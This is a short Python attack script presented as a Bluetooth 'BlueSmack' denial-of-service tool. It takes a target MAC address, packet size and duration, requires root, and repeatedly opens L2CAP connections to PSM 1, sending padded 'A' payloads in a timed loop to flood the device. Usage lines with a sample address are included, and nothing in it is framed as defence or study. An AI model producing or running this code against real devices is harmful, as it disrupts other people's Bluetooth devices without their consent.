# Bluetooth BlueSmack Attack (L2CAP Ping Flood) - DoS
# Coded by Mr. Sabaz Ali Khan Cyber Security Division
# Targets: Bluetooth-enabled devices with L2CAP vulnerability
# Usage: python bluesmack_dos.py <TARGET_MAC> <PACKET_SIZE> <DURATION>
# Note: Requires root & bluetooth interface (hciconfig hci0 up)

import bluetooth
import threading
import time
import sys
import os

if os.geteuid() != 0:
    print("[!] Run as root. sudo python bluesmack_dos.py")
    sys.exit(1)

def blueSmack(target, size, duration):
    print(f"[+] Launching BlueSmack DoS on {target} | Packet Size: {size} | Duration: {duration}s")
    end_time = time.time() + duration
    success = 0
    fail = 0

    while time.time() < end_time:
        try:
            sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
            sock.settimeout(5)
            sock.connect((target, 1))  # L2CAP ping on PSM 1
            packet = "A" * size
            sock.send(packet)
            sock.close()
            success += 1
        except bluetooth.btcommon.BluetoothError as e:
            fail += 1
            continue
        except Exception as e:
            fail += 1
            continue

    print(f"[+] Attack Complete | Sent: {success} | Failed: {fail}")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python bluesmack_dos.py <TARGET_MAC> <PACKET_SIZE> <DURATION>")
        print("Example: python bluesmack_dos.py 00:11:22:33:44:55 660 300")
        sys.exit(1)

    target_mac = sys.argv[1]
    packet_size = int(sys.argv[2])
    duration = int(sys.argv[3])

    # Validate MAC
    if not bluetooth.is_valid_address(target_mac):
        print("[!] Invalid Bluetooth MAC address")
        sys.exit(1)

    blueSmack(target_mac, packet_size, duration)